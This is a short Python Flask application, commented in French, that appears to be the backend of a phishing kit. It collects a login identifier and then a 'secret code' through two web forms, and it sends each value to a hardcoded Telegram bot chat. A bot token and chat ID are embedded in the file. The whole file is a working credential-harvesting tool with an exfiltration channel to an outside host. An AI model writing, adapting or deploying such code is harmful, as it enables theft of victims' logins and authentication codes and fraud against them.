import os
from flask import Flask, request, render_template, redirect
import requests

app = Flask(__name__)

# 🔐 Clé API et ID de chat Telegram
TELEGRAM_BOT_TOKEN = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A'
TELEGRAM_CHAT_ID = '6297861735'

# 📄 Route d'accueil qui affiche le formulaire d'identifiant
@app.route('/')
def home():
    return render_template('index.html')

# 📤 Route de traitement du formulaire d'identifiant
@app.route('/submit', methods=['POST'])
def submit():
    identifiant = request.form.get('identifiant')
    message = f"📥 Nouveau formulaire reçu :\n🔑 Identifiant : {identifiant}"

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    response = requests.post(url, data=data)
    print(f"Envoi identifiant : {response.status_code} - {response.text}")

    return redirect('/code-secret')

# 🔐 Route pour la saisie et l'envoi du code secret
@app.route('/code-secret', methods=['GET', 'POST'])
def code_secret():
    if request.method == 'POST':
        code = request.form.get('code')
        print(f"✅ Code reçu : {code}")

        message = f"🔐 Code secret reçu : {code}"
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
        response = requests.post(url, data=data)
        print(f"Envoi code : {response.status_code} - {response.text}")

        return "Code reçu !"
    return render_template('code-secret.html')

# 🚀 Lancement de l'application Flask
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
